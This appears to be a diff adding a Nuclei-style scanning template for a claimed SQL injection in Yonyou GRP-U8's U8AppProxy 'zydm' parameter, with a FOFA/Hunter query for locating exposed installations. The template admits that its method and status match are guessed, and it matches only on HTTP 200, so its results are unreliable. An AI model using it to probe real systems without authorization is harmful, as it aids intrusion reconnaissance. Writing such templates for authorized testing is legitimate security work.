@@ -1,0 +1,23 @@
+id: poc-e78cbebf5ee2bbba5e5d
+info:
+  name: 用友GRP-U8zydm存在sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e78cbebf5ee2bbba5e5d508bd54361c1
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: e78cbebf5ee2bbba5e5d508bd54361c1
+    fofa: + hunter`app.name="用友GRP-U8 OA"`
+http:
+- raw:
+  - 'GET /U8AppProxy?gnid=notify&id=sign-read&zydm=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
